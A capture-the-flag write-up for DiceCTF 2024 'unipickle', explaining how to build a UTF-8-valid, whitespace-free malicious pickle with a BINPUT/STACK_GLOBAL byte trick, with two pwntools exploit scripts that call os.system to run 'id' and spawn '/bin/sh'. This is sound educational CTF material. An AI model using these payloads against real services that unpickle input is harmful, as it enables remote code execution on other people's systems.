# DiceCTF 2024 Quals unipickle

```python
#!/usr/local/bin/python
import pickle
pickle.loads(input("pickle: ").split()[0].encode())
```

Requirements:

1. No whitespace (`.split()[0]`): use `STACK_GLOBAL` (no newlines needed)
2. Valid UTF-8 (`.encode()`): use `BINPUT` to consume leading byte 0xC2 as integer index, then `STACK_GLOBAL` as continuation byte 0x93

`STACK_GLOBAL` (0x93) is the only `find_class` opcode that doesn't need newlines. But 0x93 is a non-ASCII UTF-8 continuation byte, always preceded by a leading byte 0xC2 (from U+0093). `BINPUT` (q, 0x71) reads 1 byte as a memo index without pushing to the stack, making it ideal for consuming 0xC2 while leaving 0x93 as the `STACK_GLOBAL` opcode:

1. `q\u0093` -> bytes `71 C2 93`
2. `q` reads `\xc2` as index 194, stores `stack[-1]` in `memo[194]`
3. `\x93` = `STACK_GLOBAL`: pops `'system'` (name), `'os'` (module) -> `os.system`

## Approach A

Attack script:

```python
from pwn import *
context.log_level = 'info'

p = process(['python3', 'unipickle.py'])
s = 'U\x02osU\x06systemq\u0093(U\x02idtR.'
p.sendline(s.encode('utf-8'))
print(p.recvall(timeout=5).decode(errors='replace'))
```

Disassembled:

```
    0: U    SHORT_BINSTRING 'os'
    4: U    SHORT_BINSTRING 'system'
   12: q    BINPUT     194
   14: \x93 STACK_GLOBAL
   15: (    MARK
   16: U        SHORT_BINSTRING 'id'
   20: t        TUPLE      (MARK at 15)
   21: R    REDUCE
   22: .    STOP
```

`q\u0093` → BINPUT reads `\xc2` as index 194 without pushing, then `\x93` = STACK_GLOBAL pops `'system'`/`'os'`.

## Approach B (official)

Official solution is taken from <https://github.com/dicegang/dicectf-quals-2024-challenges/blob/main/misc/unipickle/solution.py>:

```python
from pwn import *
p = remote('mc.ax', 31773)
p.sendlineafter('pickle: ', b'X\x02\x00\x00\x00osX\x06\x00\x00\x00systemq\xc2\x8f00h\xc2\x93(X\x07\x00\x00\x00/bin/shtR.')
p.interactive()
```

Disassembled:

```
    0: X    BINUNICODE 'os'
    7: X    BINUNICODE 'system'
   18: q    BINPUT     194
   20: \x8f EMPTY_SET
   21: 0    POP
   22: 0    POP
   23: h    BINGET     194
   25: \x93 STACK_GLOBAL
   26: (    MARK
   27: X        BINUNICODE '/bin/sh'
   39: t        TUPLE      (MARK at 26)
   40: R    REDUCE
   41: .    STOP

```

Two multi-byte sequences instead of one:

- `q\xc2\x8f`: BINPUT consumes `\xc2`, then `\x8f` = EMPTY_SET.
- `00`: POP to remove frozenset, POP to remove `'system'`, leaving `['os']`.
- `h\xc2\x93`: BINGET reads `\xc2` as index, retrieves `'system'` from memo, then `\x93` = STACK_GLOBAL.
